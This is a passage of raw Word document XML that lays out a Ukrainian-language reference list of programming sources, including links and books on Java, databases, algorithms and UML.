          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>https://ru.wikipedia.org/wiki/%D0%AF%D0%B7%D1%8B%D0%BA_%D0%BF%D1%80%D0%BE%D0%B3%D1%80%D0 % B0% D0% BC% D0% BC% D0% B8% D1% 80% D0% BE% D0% B2% D0% B0% D0% BD% D0% B8% D1% 8F</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="00A7731B" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>https://studopedia.su/7_36667_yaziki-programmirovaniya-nizkogo-urovnya.html</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="00A7731B" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>http://maksakov-sa.ru/ProgrProd/YazProgr/index.html</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="00A7731B" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">Початок роботи з </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> SE Шевченко Д.В. Проскуріна Г.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="00A7731B" w:rsidRDefault="0060216E" w:rsidP="0060216E">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lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">: Методи програмування І.М. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>Блінов</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> В.С. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>романчик</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="00A7731B" w:rsidRDefault="0060216E" w:rsidP="0060216E">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Басюк</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Т. М. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Основи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інформаційних</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технологій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навч</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посібник</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> / Т.М. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Басюк</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, Н.О. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Думанський</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, О.В. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Пасічник</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">; за наук. ред. В.В. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Пасічніка</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>.-</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Л.: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Новий</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Світ-2000, 2011.- 390 с.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="00A7731B" w:rsidRDefault="0060216E" w:rsidP="0060216E">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Васильєв</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> О.М. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Об'єктно-орієнтоване</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програмування</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Java</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Навчальний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посібник</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>СПб .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Пітер</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>, 2011. - 400с.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="00A7731B" w:rsidRDefault="0060216E" w:rsidP="0060216E">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Вірт</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Н. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Алгоритми</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> і </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>структури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даних</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">: Пер. з англ. / Н. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Вірт</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">. - </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>СПб .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Невський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діалект</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>, 2008. - 352 с.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="00A7731B" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Глава М.Г. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Організація</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> баз </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Даних</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> та </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>знань</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">: Конспект </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>лекцій</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>. [</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Електронний</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> ресурс] - Режим доступу: http://library.opu.ua.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="00A7731B" w:rsidRDefault="0060216E" w:rsidP="0060216E">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Гіберт</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ш.Б. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Java</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Повне</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керівництво</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, 8-е </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>видання</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Посібник</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програміста</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">. - </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>СПб .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Київ</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>, 2013. - 175с.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="00A7731B" w:rsidRDefault="0060216E" w:rsidP="0060216E">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Копитко</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> М.Ф., </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Іванків</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> К.С. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Основи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програмування</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мовою</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Java</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Тексти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лекцій</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">. - </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Львів</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Видавничий</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> центр ЛНУ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ім</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Івана</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Франка, 2002. - 83 с.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="00A7731B" w:rsidRDefault="0060216E" w:rsidP="0060216E">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Фаулер</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Мартін</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">. UML. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Основи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Третє</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видання</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
          <w:rFonts w:eastAsia="Symbol" w:cs="Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">. Короткий </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A7731B">
        <w:rPr>
